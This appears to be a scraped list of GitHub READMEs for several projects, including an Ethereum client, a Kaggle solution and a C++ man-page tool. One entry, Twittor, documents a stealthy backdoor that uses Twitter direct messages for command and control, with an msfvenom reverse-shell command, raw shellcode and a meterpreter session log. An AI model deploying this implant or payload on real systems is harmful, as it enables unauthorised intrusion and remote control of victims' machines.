[{"repo": "/ethereum/aleth", "language": "C++", "readme_contents": "# Aleth \u2013 Ethereum C++ client, tools and libraries\n\n> The collection of C++ libraries and tools for Ethereum,\n> formerly known as _cpp-ethereum_ project.\n> This includes the full Ethereum client **aleth**.\n\n\n## Contact\n\n[![Gitter](https://img.shields.io/gitter/room/ethereum/aleth.svg)](https://gitter.im/ethereum/aleth)\n[![GitHub Issues](https://img.shields.io/github/issues-raw/ethereum/aleth.svg)](https://github.com/ethereum/aleth/issues)\n\n- Chat in [aleth channel on Gitter](https://gitter.im/ethereum/aleth).\n- Report bugs, issues or feature requests using [GitHub issues](https://github.com/ethereum/aleth/issues/new).\n\n\n## Usage\n\nThe Ethereum Documentation site hosts the **[aleth homepage](http://cpp-ethereum.org)**, which\nhas a Quick Start section.\n\n\nOperating system | Status\n---------------- | ----------\nUbuntu and macOS | [![TravisCI](https://img.shields.io/travis/ethereum/aleth/develop.svg)](https://travis-ci.org/ethereum/aleth)\nWindows          | [![AppVeyor](https://img.shields.io/appveyor/ci/ethereum/cpp-ethereum/develop.svg)](https://ci.appveyor.com/project/ethereum/cpp-ethereum)\n\n\n## Install\n\n### Download release binaries\n\nhttps://github.com/ethereum/aleth/releases\n\n### Using docker images\n\nAleth:\n```bash\ndocker run ethereum/aleth --help\n```\n\nTesteth:\n```bash\ndocker run ethereum/testeth --help\n```\n\n### Building from source\n\n#### Get the source code\n\nGit and GitHub are used to maintain the source code. Clone the repository by:\n\n```shell\ngit clone --recursive https://github.com/ethereum/aleth.git\ncd aleth\n```\n\nThe `--recursive` option is important. It orders git to clone additional\nsubmodules to build the project.\nIf you missed `--recursive` option, you are able to correct your mistake with command\n`git submodule update --init`.\n\n#### Install CMake\n\nCMake is used to control the build configuration of the project. Latest version of CMake is required\n(at the time of writing [3.9.3 is the minimum](CMakeLists.txt#L5)).\nWe strongly recommend you to install CMake by downloading and unpacking the binary\ndistribution  of the latest version available on the\n[**CMake download page**](https://cmake.org/download/).\n\nThe CMake package available in your operating system can also be installed\nand used if it meets the minimum version requirement.\n\n> **Alternative method**\n>\n> The repository contains the\n[scripts/install_cmake.sh](scripts/install_cmake.sh) script that downloads\n> a fixed version of CMake and unpacks it to the given directory prefix.\n> Example usage: `scripts/install_cmake.sh --prefix /usr/local`.\n\n#### Build\n\nConfigure the project build with the following command to create the\n`build` directory with the configuration.\n\n```shell\nmkdir build; cd build  # Create a build directory.\ncmake ..               # Configure the project.\ncmake --build .        # Build all default targets.\n```\n\nOn **Windows** we support Visual Studio 2017, and 2019. You should generate a Visual Studio solution file (`.sln`) for the 64-bit architecture via the following command:\n\n* **Visual Studio 2017**: `cmake .. -G \"Visual Studio 15 2017 Win64\"`\n* **Visual Studio 2019**: `cmake .. -G \"Visual Studio 16 2019\" -A x64`\n\nAfter the necessary dependencies have been downloaded and built and the solution has been generated, `aleth.sln` can be found in the\n`build` directory.\n\n#### Common Issues Building on Windows\n##### LINK : fatal error LNK1158: cannot run 'rc.exe'\nRc.exe is the [Microsoft Resource Compiler](https://docs.microsoft.com/en-us/windows/desktop/menurc/resource-compiler). It's distributed with the [Windows SDK](https://developer.microsoft.com/en-US/windows/downloads/windows-10-sdk) and is required for generating the Visual Studio solution file. It can be found in the following directory: ```%ProgramFiles(x86)%\\Windows Kits\\<OS major version>\\bin\\<OS full version>\\<arch>\\```\n\nIf you hit this error, adding the directory to your path (and launching a new command prompt) should fix the issue.\n\n## Contribute\n\n[![Contributors](https://img.shields.io/github/contributors/ethereum/aleth.svg)](https://github.com/ethereum/aleth/graphs/contributors)\n[![Gitter](https://img.shields.io/gitter/room/ethereum/aleth.svg)](https://gitter.im/ethereum/aleth)\n[![up-for-grabs](https://img.shields.io/github/issues-raw/ethereum/aleth/help%20wanted.svg)](https://github.com/ethereum/aleth/labels/help%20wanted)\n\nThe current codebase is the work of many, many hands, with over 100\n[individual contributors](https://github.com/ethereum/aleth/graphs/contributors) over the course of its development.\n\nOur day-to-day development chat happens on the\n[aleth](https://gitter.im/ethereum/aleth) Gitter channel.\n\nAll contributions are welcome! We try to keep a list of tasks that are suitable\nfor newcomers under the tag\n[help wanted](https://github.com/ethereum/aleth/labels/help%20wanted).\nIf you have any questions, please do not hesitate to ask us about more information.\n\nPlease read [CONTRIBUTING](CONTRIBUTING.md) and [CODING_STYLE](CODING_STYLE.md)\nthoroughly before making alterations to the code base.\n\nAll development goes in develop branch.\n\n## Usage\n*Note: The following is the output of ```./aleth -h [--help]``` on Linux*\n\n```\nNAME:\n   aleth 1.7.2\nUSAGE:\n   aleth [options]\n\nWALLET USAGE:\n   account list                                List all keys available in wallet\n   account new                                 Create a new key and add it to wallet\n   account update [<uuid>|<address> , ... ]    Decrypt and re-encrypt keys\n   account import [<uuid>|<file>|<secret-hex>] Import keys from given source and place in wallet\n   wallet import <file>                        Import a presale wallet\n\nCLIENT MODE (default):\n  --mainnet                               Use the main network protocol\n  --ropsten                               Use the Ropsten testnet\n  --test                                  Testing mode; disable PoW and provide test rpc interface\n  --config <file>                         Configure specialised blockchain using given JSON information\n\n  --ipc                                   Enable IPC server (default: on)\n  --ipcpath <path>                        Set .ipc socket path (default: data directory)\n  --no-ipc                                Disable IPC server\n  --admin <password>                      Specify admin session key for JSON-RPC (default: auto-generated and printed at start-up)\n  -K [ --kill ]                           Kill the blockchain first\n  -R [ --rebuild ]                        Rebuild the blockchain from the existing database\n  --rescue                                Attempt to rescue a corrupt database\n\n  --import-presale <file>                 Import a pre-sale key; you'll need to specify the password to this key\n  -s [ --import-secret ] <secret>         Import a secret key into the key store\n  -S [ --import-session-secret ] <secret> Import a secret session into the key store\n  --master <password>                     Give the master password for the key store; use --master \"\" to show a prompt\n  --password <password>                   Give a password for a private key\n\nCLIENT TRANSACTING:\n  --ask <wei>            Set the minimum ask gas price under which no transaction will be mined (default: 20000000000)\n  --bid <wei>            Set the bid gas price to pay for transactions (default: 20000000000)\n  --unsafe-transactions  Allow all transactions to proceed without verification; EXTREMELY UNSAFE\n\nCLIENT NETWORKING:\n  -b [ --bootstrap ]              Connect to the default Ethereum peer servers (default unless --no-discovery used)\n  --no-bootstrap                  Do not connect to the default Ethereum peer servers (default only when --no-discovery is used)\n  -x [ --peers ] <number>         Attempt to connect to a given number of peers (default: 11)\n  --peer-stretch <number>         Give the accepted connection multiplier (default: 7)\n  --public-ip <ip>                Force advertised public IP to the given IP (default: auto)\n  --listen-ip <ip>(:<port>)       Listen on the given IP for incoming connections (default: 0.0.0.0)\n  --listen <port>                 Listen on the given port for incoming connections (default: 30303)\n  -r [ --remote ] <host>(:<port>) Connect to the given remote host (default: none)\n  --port <port>                   Connect to the given remote port (default: 30303)\n  --network-id <n>                Only connect to other hosts with this network id\n  --allow-local-discovery         Include local addresses in the discovery process. Used for testing purposes.\n  --peerset <list>                Comma delimited list of peers; element format: type:enode://publickey@ipAddress[:port[?discport=port]]\n                                          Types:\n                                          default     Attempt connection when no other peers are available and pinning is disabled\n                                          required    Keep connected at all times\n\n                                          Ports:\n                                          The first port argument is the tcp port used for direct communication among peers. If the second port\n                                          argument isn't supplied, the first port argument will also be the udp port used for node discovery.\n                                          If neither the first nor second port arguments are supplied, a default port of 30303 will be used for\n                                          both peer communication and node discovery.\n  --no-discovery                  Disable node discovery; implies --no-bootstrap\n  --pin                           Only accept or connect to trusted peers\n\nCLIENT MINING:\n  -a [ --address ] <addr>         Set the author (mining payout) address (default: auto)\n  -m [ --mining ] <on/off/number> Enable mining; optionally for a specified number of blocks (default: off)\n  --extra-data arg                Set extra data for the sealed blocks\n\nBENCHMARKING MODE:\n  -M [ --benchmark ]           Benchmark for mining and exit\n  --benchmark-warmup <seconds> Set the duration of warmup for the benchmark tests (default: 3)\n  --benchmark-trial <seconds>  Set the duration for each trial for the benchmark tests (default: 3)\n  --benchmark-trials <n>       Set the number of trials for the benchmark tests (default: 5)\n\nMINING CONFIGURATION:\n  -C [ --cpu ]                 When mining, use the CPU\n  -t [ --mining-threads ] <n>  Limit number of CPU/GPU miners to n (default: use everything available on selected platform)\n  --current-block <n>          Let the miner know the current block number at configuration time. Will help determine DAG size and required GPU memory\n  --disable-submit-hashrate    When mining, don't submit hashrate to node\n\nIMPORT/EXPORT MODES:\n  -I [ --import ] <file>      Import blocks from file\n  -E [ --export ] <file>      Export blocks to file\n  --from <n>                  Export only from block n; n may be a decimal, a '0x' prefixed hash, or 'latest'\n  --to <n>                    Export only to block n (inclusive); n may be a decimal, a '0x' prefixed hash, or 'latest'\n  --only <n>                  Equivalent to --export-from n --export-to n\n  --format <binary/hex/human> Set export format\n  --dont-check                Prevent checking some block aspects. Faster importing, but to apply only when the data is known to be valid\n  --download-snapshot <path>  Download Parity Warp Sync snapshot data to the specified path\n  --import-snapshot <path>    Import blockchain and state data from the Parity Warp Sync snapshot\n\nDATABASE OPTIONS:\n  --db <name> (=leveldb)      Select database implementation. Available options are: leveldb, memorydb.\n  --db-path <path> (=$HOME/.ethereum) Database path (for non-memory database options)\n\nVM OPTIONS:\n  --vm <name>|<path> (=legacy) Select VM implementation. Available options are: interpreter, legacy.\n  --evmc  <option>=<value>     EVMC option\n\nLOGGING OPTIONS:\n  -v [ --log-verbosity ] <0 - 4>        Set the log verbosity from 0 to 4 (default: 2).\n  --log-channels <channel_list>         Space-separated list of the log channels to show (default: show all channels).\n                                        Channels: block blockhdr bq chain client debug discov error ethcap exec host impolite info net overlaydb p2pcap peer\n                                        rlpx rpc snap statedb sync timer tq trace vmtrace warn warpcap watch\n  --log-exclude-channels <channel_list> Space-separated list of the log channels to hide.\n\n  --log-vmtrace                         Enable VM trace log (requires log-verbosity 4).\n\nGENERAL OPTIONS:\n  -d [ --data-dir ] <path> Load configuration files and keystore from path (default: $HOME/.ethereum)\n  -V [ --version ]         Show the version and exit\n  -h [ --help ]            Show this help message and exit\n```\n\n## Mining\n\nThis project is **not suitable for Ethereum mining** because the support for GPU mining\nhas been dropped some time ago including the ethminer tool. Use the ethminer tool from https://github.com/ethereum-mining/ethminer.\n\n## Testing\nDetails on how to run and debug the tests can be found [here](doc/usingtesteth.rst)\n\n\n## Documentation\n\n- [Internal documentation for developers](doc/index.rst).\n- [Outdated documentation for end users](http://www.ethdocs.org/en/latest/ethereum-clients/cpp-ethereum/).\n\n\n## License\n\n[![License](https://img.shields.io/github/license/ethereum/aleth.svg)](LICENSE)\n\nAll contributions are made under the [GNU General Public License v3](https://www.gnu.org/licenses/gpl-3.0.en.html). See [LICENSE](LICENSE).\n"}, {"repo": "/HouJP/kaggle-quora-question-pairs", "language": "Python", "readme_contents": "****\n\n#\t<center>Kaggle: Quora Question Pairs (Comming Soon)</center>\n##### <center>Author: Liang Pang, Yixing Fan, Jianpeng Hou, Xinyu Yue, Guocheng Niu</center>\n\n****\n\n##\tCategories\n*\t[Abstract](#abstract)\n* \t[Summary](#summary)\n\n****\n\n##\t<a name=\"abstract\"> Abstract </a>\n\nIn the Quora Question Pairs Challenge, we were asked to build a model to classify whether question pairs are duplicates or not (multiple versions of the same question). Our final submission was a stacking result of multiple models. This submission scored **0.11450** on Public LB and **0.11768** on Private LB (with post-process), ranking **4** out of **3396** teams. This documents describes our team's solution which can be divided into diffrent parts: Pre-processing, Feature Engineering, Modeling and Post-processing.\n\n****\n\n##\t<a name=\"summary\"> Summary </a>\n\nOur solution consisted of four main parts: Pre-processing, Feature Engineering, Modeling and Post-processing. What's more, we developed a light weight Machine Learning framework **FeatWheel** to help us to finish ML jobs, such as feature extraction, feature merging and so on.\n\nIn pre-processing, we process the text of data with text cleaning, word stemming, removing stop words and shared words and can form different versions of original data. In feature engineering, we extracted features based on various versions of data. The features can be classified in to three categories\uff1aStatistical Features, NLP Features and Graph Features. In modeling, we build deep models, boosting models (using XGBoost, LightGBM) and linear models (Linear Regression) and build a multi-layer stacking system to ensemble different models together. As we all know, the distribution of the training data and test data are quite different, so we made post-processing on the prediction results. We cut the data into different parts according to the clique size and rescale the results in different parts. \n\n###\tFlowchart\n\nThe flowchart of our method is shown as follows:\n\n![flowchart](./img/flowchart.png)\n\n###\tSubmission\n\nSubmissions were evaluated on the log loss between the predicted values and the group truth. In specific, the best single model we have obtained during the competition was an XGBoost model with tree booster of Public LB score **0.12653** and Private LB score **0.13067** (without post-process). Our final submission was a stacking result of multiple models. This submission scored **0.11450** on Public LB and **0.11768** on Private LB (with post-process), ranking **4** out of **3396** teams.\n\n****\n\n### Deep Model\n\nPlease see [TextNet](https://github.com/pl8787/textnet-release) and [TextNet-Model](https://github.com/pl8787/textnet-model). For tensorflow version, please checkout [MatchZoo](https://github.com/faneshion/MatchZoo).\n"}, {"repo": "/aitjcize/cppman", "language": "Python", "readme_contents": ".. image:: http://img.shields.io/travis/aitjcize/cppman.svg?style=flat\n   :target: https://travis-ci.org/aitjcize/cppman\n.. image:: http://img.shields.io/pypi/v/cppman.svg?style=flat\n   :target: https://pypi.python.org/pypi/cppman\n.. image::  https://img.shields.io/github/downloads/aitjcize/cppman/total.svg\n   :target: https://pypi.python.org/pypi/cppman#downloads\n\ncppman\n======\nC++ 98/11/14/17/20 manual pages for Linux, with source from `cplusplus.com <http://cplusplus.com/>`_ and `cppreference.com <https://cppreference.com/>`_.\n\n.. image:: https://raw.github.com/aitjcize/cppman/master/wiki/screenshot.png\n\nFeatures\n--------\n* Supports two backends (switch it with ``cppman -s``):\n\n  + `cplusplus.com <http://cplusplus.com/>`_\n  + `cppreference.com <http://cppreference.com/>`_\n\n* Syntax highlighting support for sections and example source code.\n* Usage/Interface similar to the 'man' command\n* Hyperlink between manpages (only available when pager=vim)\n\n  + Press ``Ctrl-]`` when cursor is on keyword to go forward and ``Ctrl-T`` to go backward.\n  + You can also double-click on keyword to go forward and right-click to go backward.\n\n* Frequently update to support `cplusplus.com <http://cplusplus.com/>`_.\n\nDemo\n----\nUsing vim as pager\n\n.. image:: https://raw.github.com/aitjcize/cppman/master/wiki/demo.gif\n\nInstallation\n------------\n1. Install from PyPI:\n\n.. code-block:: bash\n\n    $ pip install cppman\n\nNote that cppman requires Python 3. Make sure that either ``pip`` is configured for Python 3 installation, your default Python interpreter is version 3 or just use ``pip3`` instead.\n\n2. Arch Linux users can find it on AUR or using `Trizen <https://wiki.archlinux.org/title/Trizen>`_:\n\n.. code-block:: bash\n\n    $ trizen -S cppman\n\nor install the git version\n\n.. code-block:: bash\n\n    $ trizen -S cppman-git\n\n3. Debian / Ubuntu: cppman is available in Debian sid/unstable and Ubuntu vivid.\n\n.. code-block:: bash\n\n    $ sudo apt-get install cppman\n\nPackage Maintainers\n-------------------\n* Arch Linux: myself\n* Debian: `czchen <https://github.com/czchen>`_\n* Gentoo: `rindeal <https://github.com/rindeal>`_\n* MacPorts: `eborisch <https://github.com/eborisch>`_\n\nFAQ\n---\n* Q: Can I use the system ``man`` command instead of ``cppman``?\n* A: Yes, just execute ``cppman -m true`` and all cached man pages are exposed to the system ``man`` command.  Note: You may want to download all available man pages with ``cppman -c``.\n* Q: Why is bash completion is not working properly with ``::``?\n* A: It is because bash treats ``:`` like a white space. To fix this add ``export COMP_WORDBREAKS=\" /\\\"\\'><;|&(\"`` to your ``~/.bashrc``.\n\nBugs\n----\n* Please report bugs / mis-formatted pages to the github issue tracker.\n\nContributing\n------------\n1. Fork it\n2. Create your feature branch (``git checkout -b my-new-feature``)\n3. Commit your changes (``git commit -am 'Add some feature'``)\n4. Push to the branch (``git push origin my-new-feature``)\n5. Create new Pull Request\n\nNotes\n-----\n* manpages-cpp is renamed to cppman since September 19, 2012\n"}, {"repo": "/PaulSec/twittor", "language": "Python", "readme_contents": "Twittor\n====\nA stealthy Python based backdoor that uses Twitter (Direct Messages) as a command and control server\nThis project has been inspired by [Gcat](https://github.com/byt3bl33d3r/gcat) which does the same but using a Gmail account.\n\nSetup \n=====\nFor this to work you need:\n- A Twitter account (**Use a dedicated account! Do not use your personal one!**)\n- [Register an app](https://apps.twitter.com/app/new) on Twitter with **Read, write, and direct messages** Access levels. \n\nInstall the dependencies:\n\n```\n$ pip install -r requirements.txt\n```\n\nThis repo contains two files:\n- ```twittor.py``` which is the client\n- ```implant.py``` the actual backdoor to deploy\n\nIn both files, edit the access token part and add the ones that you previously generated:\n\n```python\nCONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\nCONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\n\nACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\nACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\n\nUSERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'\n```\n\nYou're probably going to want to compile ```implant.py``` into an executable using [Pyinstaller](https://github.com/pyinstaller/pyinstaller)\nIn order to remove the console when compiling with Pyinstaller, the flags ```--noconsole --onefile``` will help. Just saying. \n\nUsage\n=====\n\nIn order to run the client, launch the script. \n\n```\n$ python twittor.py\n```\n\nYou'll then get into an 'interactive' shell which offers few commands that are:\n\n```\n$ help\n\n    refresh - refresh C&C control\n    list_bots - list active bots\n    list_commands - list executed commands\n    !retrieve <jobid> - retrieve jobid command\n    !cmd <MAC ADDRESS> command - execute the command on the bot\n    !shellcode <MAC ADDRESS> shellcode - load and execute shellcode in memory (Windows only)\n    help - print this usage\n    exit - exit the client\n    \n$ \n```\n\n- Once you've deployed the backdoor on a couple of systems, you can check available clients using the list command:\n```\n$ list_bots\nB7:76:1F:0B:50:B7: Linux-x.x.x-generic-x86_64-with-Ubuntu-14.04-precise\n$\n```\n\nThe output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on. In that case a Linux box. \n\n\n- Let's issue a command to an implant:\n```\n$ !cmd B7:76:1F:0B:50:B7 cat /etc/passwd\n[+] Sent command \"cat /etc/passwd\" with jobid: UMW07r2\n$\n```\n\nHere we are telling ```B7:76:1F:0B:50:B7``` to execute ```cat /etc/passwd```, the script then outputs the ```jobid``` that we can use to retrieve the output of that command\n\n- Lets get the results!\n\n```\n$ !retrieve UMW07r2\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\n(...)\n```\n\nCommand to use in that case is ```!retrieve``` followed by the jobid from the command. \n\n- Refresh results\n\nIn order to retrieve new bots/command outputs but also force the client to refresh the results, use the ```refresh``` command.\n\n```\n$ refresh\n[+] Sending command to retrieve alive bots\n[+] Sleeping 10 secs to wait for bots\n$\n```\n\nThis will send a ```PING``` request and wait 10 seconds for them to answer.\nDirect messages will then be parsed - Bot list will be refreshed but also the command list, including new command outputs. \n\n- Retrieve previous commands\n\nAs I said earlier, (previous) commands will be retrieved from older direct messages (limit is 200) and you can actually retrieve/see them by using the ```list_commands``` command\n\n```\n$ list_commands\n8WNzapM: 'uname -a ' on 2C:4C:84:8C:D3:B1\nVBQpojP: 'cat /etc/passwd' on 2C:4C:84:8C:D3:B1\n9KaVJf6: 'PING' on 2C:4C:84:8C:D3:B1\naCu8jG9: 'ls -al' on 2C:4C:84:8C:D3:B1\n8LRtdvh: 'PING' on 2C:4C:84:8C:D3:B1\n$\n```\n\n- Running shellcode (Windows hosts)\n\nThis option might be handy in order to retrieve a meterpreter session and [this article](http://netsec.ws/?p=331#more-331) becomes really useful. \n\nGenerate your meterpreter shellcode, like: \n\n```\n# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=3615 -f python\n(...)\nPayload size: 299 bytes\nbuf =  \"\"\nbuf += \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"\nbuf += \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"\nbuf += \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"\nbuf += \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"\nbuf += \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"\nbuf += \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"\nbuf += \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"\nbuf += \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"\nbuf += \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"\nbuf += \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"\nbuf += \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\nbuf += \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"\nbuf += \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"\nbuf += \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"\nbuf += \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x00\\x00\\x01\\x68\"\nbuf += \"\\x02\\x00\\x0e\\x1f\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"\nbuf += \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\"\nbuf += \"\\xe8\\x3f\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\"\nbuf += \"\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\xe9\\x8b\\x36\\x6a\"\nbuf += \"\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\"\nbuf += \"\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\"\nbuf += \"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\xc3\\x01\\xc3\\x29\\xc6\"\nbuf += \"\\x75\\xe9\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\"\n```\n\nExtract the shellcode and send it to the specified bot using the ```!shellcode``` command! \n\n```\n$ !shellcode 11:22:33:44:55 \\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b (...)\n[+] Sent shellcode with jobid: xdr7mtN\n$\n```\n\nEt voil\u00e0! \n\n```\nmsf exploit(handler) > exploit\n\n[*] Started reverse handler on 10.0.0.1:3615 \n[*] Starting the payload handler...\n[*] Sending stage (884270 bytes) to 10.0.0.99\n[*] Meterpreter session 1 opened (10.0.0.1:3615 -> 10.0.0.99:49254) at 2015-09-08 10:19:04 -0400\n\nmeterpreter > getuid\nServer username: WIN-XXXXXXXXX\\PaulSec\n```\n\nOpen a beer and enjoy your reverse meterpreter shell. \n\nContributing and/or questions? \n=====\n\nProject is entirely open source and released under MIT license.\nI mostly wanted to create a PoC after Twitter decided to remove the 140 characters limit for the Direct Messages. \nFew stuff should be added such as Encryption (Adding AES on top of it). \n\"Messages\" are using a dictionary data structure and the whole command is only base64 encoded. \nFork the project, contribute, submit pull requests, and have fun. \n\nIf you find a bug, open an issue on Github and/or ping me on [Twitter](http://twitter.com/PaulWebSec).\n\nAgain, feel free to check the [Gcat](https://github.com/byt3bl33d3r/gcat) amazing project from [byt3bl33d3r](https://twitter.com/byt3bl33d3r) that inspired me a lot.\n"}, {"repo": "/cliftonm/MerkleTree", "language": "HTML", "readme_contents": "# MerkleTree\nA Merkle Tree implementation in C#\n\n# Documentation\n[Full Description](https://cdn.rawgit.com/cliftonm/MerkleTree/master/Article/indexWithToc.htm)\n\n# Explore Audit and Consistency Proofs\n![FlowSharp](https://github.com/cliftonm/MerkleTree/blob/master/Article/demo1.png)\n"}, {"repo": "/liufeihong/Hyper-Upload-Server", "language": "HTML", "readme_contents": "# Hyper Upload Server \u8d85\u7ea7\u4e0a\u4f20\u670d\u52a1\u5668\n\n\u8fd9\u662f\u4e00\u6b3e\u8d85\u7ea7\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5668\uff0c\u91c7\u7528\u5f02\u6b65I/O\u67b6\u6784\uff0c\u91c7\u7528C++\u8bed\u8a00\u7f16\u7801\u5b9e\u73b0\u3002\u5b83\u652f\u63014GB\u4ee5\u4e0a\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\u548c\u65ad\u70b9\u7eed\u4f20\uff0c\u652f\u6301Windows\u548cLinux\u670d\u52a1\u5668\u5e73\u53f0\uff0c\u652f\u6301\u4efb\u610f\u683c\u5f0f\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u5c24\u5176\u9002\u5408\u5927\u7684\u89c6\u9891\u7f51\u7ad9\u5e94\u7528\u3002\u5355\u53f0\u670d\u52a1\u5668\u652f\u63011000\u5e76\u53d1\u4e0a\u4f20\u8fdb\u7a0b\uff0c\u652f\u6301PC\u7aef\u548c\u667a\u80fd\u624b\u673a\u7aef\u4e3b\u6d41\u7684\u6d4f\u89c8\u5668\u3002\n\n## \u4e3b\u8981\u7279\u6027\n1. \u670d\u52a1\u5668\u7aef\u91c7\u7528\u5f02\u6b65I/O\u67b6\u8bbe\u8bbe\u8ba1\uff0c\u5177\u6709\u9ad8\u6027\u80fdI/O\u5904\u7406\u80fd\u529b\uff0c\u5c24\u5176\u9002\u7528\u4e8e\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff1b\n2. \u670d\u52a1\u5668\u7aef\u91c7\u7528\u9ad8\u6548\u5185\u5b58\u5206\u914d\u6280\u672f\u786e\u4fdd\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u670d\u52a1\u5668\u7684\u5185\u5b58\u5f00\u9500\u6700\u5c0f\u5316\uff1b\n3. \u5b8c\u5168\u91c7\u7528\u6807\u51c6\u534f\u8bae\u5b9e\u73b0\uff0c\u56e0\u6b64\u517c\u5bb9\u51e0\u4e4e\u6240\u6709\u7684PC\u7aef\u548c\u79fb\u52a8\u7aef\u6d4f\u89c8\u5668\uff1b\n4. \u670d\u52a1\u5668\u7aef\u91c7\u7528C++\u8bed\u8a00\u81ea\u4e3b\u5b9e\u73b0\uff0c\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u5c3a\u5bf8\u65e0\u9650\u5236\uff0c\u5929\u751f\u652f\u6301\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\u3002\n   \u800c\u57fa\u4e8ePHP\u3001JAVA\u7b49\u6280\u672f\u5b9e\u73b0\u7684\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5929\u751f\u65e0\u6cd5\u652f\u6301\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff0c\u65e0\u6cd5\u903e\u8d8a2GB\u7684\u6700\u5927\u6587\u4ef6\u5c3a\u5bf8\u74f6\u9888\uff1b\n5. \u670d\u52a1\u5668\u7aef\u91c7\u7528\u65e0\u7f13\u51b2\u5373\u65f6\u5199\u5165\u65b9\u5f0f\uff0c\u4e0a\u4f20\u6570\u636e\u5199\u5165\u4e00\u6b65\u5230\u4f4d\u3002\u4e0d\u540c\u4e8ePHP\u3001JAVA\u7b49\u6280\u672f\u5b9e\u73b0\u65b9\u5f0f\u9700\u8981\u4e24\u6b65\u5199\u5165\uff1b\n6. \u670d\u52a1\u5668\u7aef\u53ef\u8de8\u5e73\u53f0\u7f16\u8bd1\u8fd0\u884c\uff0c\u652f\u6301Windows\u548cLinux\u5e73\u53f0\uff1b\n7. \u9ad8\u6027\u80fd\uff0c\u5355\u53f0\u670d\u52a1\u5668\u652f\u63011000\u4e2a\u5e76\u53d1\u4e0a\u4f20\u8fdb\u7a0b\uff1b\n8. \u652f\u63014GB\u4ee5\u4e0a\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff0c\u6587\u4ef6\u5927\u5c0f\u4e0d\u53d7\u9650\u5236\uff1b\n9. 